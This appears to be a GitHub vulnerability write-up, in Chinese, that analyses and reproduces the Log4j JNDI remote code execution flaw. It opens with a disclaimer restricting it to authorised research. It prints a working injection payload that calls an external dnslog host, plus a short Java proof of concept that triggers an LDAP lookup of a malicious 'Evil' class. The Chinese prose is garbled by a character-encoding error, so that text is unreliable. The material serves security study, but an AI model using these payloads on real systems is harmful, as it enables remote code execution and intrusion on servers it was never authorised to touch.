**æ³¨ï¼š**
```
# æœ¬æ–‡ä»…ä¾›å®‰å…¨ç ”ç©¶ä½¿ç”¨ ğŸ‘¨â€âœˆï¸
è¿™é‡Œæƒ³æä¸€å˜´ï¼Œçœ‹åˆ°å¾ˆå¤šäººåœ¨"ç–¯ç‹‚"åœ°æµ‹dnslogï¼Œå…¶å®è¿˜æ˜¯å¸Œæœ›åœ¨æ²¡æœ‰æˆæƒæƒ…å†µä¸‹æœ€å¥½ä¸è¦è¿›è¡Œæ¼æ´æ¢æµ‹/æ”»å‡»è¡Œä¸ºï¼Œæ¯•ç«Ÿ"è‡ªå¾‹æ˜¯è‡ªç”±çš„åŸºç¡€"!  ğŸ‘¨â€âœˆï¸ 
```

### æ¼æ´åˆ†æ

æ ¹æ®æµä¼ çš„payloadæ­å»ºæµ‹è¯•ç¯å¢ƒ
- payload
```
${jndi:ldap://xxxxx.dnslog.cn/exp}
```
- æ—¥å¿—çº§åˆ«
```
logger.error("xxxx")
```

- log4j_rce.java
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j_rce {
    private static final Logger logger = LogManager.getLogger(log4j_rce.class);
    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/Evil}");
    }
}
```

ä¸€æ­¥ä¸€æ­¥è·Ÿè¿›ï¼Œæœ€åè·Ÿåˆ°
- org.apache.logging.log4j.core.lookup.Interpolator#lookup

![image](https://user-images.githubusercontent.com/55024146/145439561-9dc12330-6705-4297-aeef-42413a4edc21.png)

ä¼¼ä¹å°±æ˜¯è¿™é‡Œï¼Œæµ‹è¯•ä¸€æ³¢

![image](https://user-images.githubusercontent.com/55024146/145439835-a4d042d7-80b9-47ca-a65b-8dcb24ee6bd1.png)

è¿™é‡Œå¯ä»¥è§¦å‘çš„ä¸åªæ˜¯error,é»˜è®¤æƒ…å†µä¸‹fatalä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯å®é™…çš„ä¸šåŠ¡åœºæ™¯è‚¯å®šä¼šæœ‰æ‰€ä¸åŒã€‚

### æ¼æ´å¤ç°

èµ·ä¸€ä¸ªæ¶æ„çš„LADPServerã€æ¶æ„ç±»Evil

![image](https://user-images.githubusercontent.com/55024146/145442280-7bfa4038-276e-414b-b0b6-2c1dc6e92e74.png)

ç„¶åè§¦å‘å³å¯

![image](https://user-images.githubusercontent.com/55024146/145442499-f7b1aff3-5c61-4fea-8903-b54d3f1b161c.png)





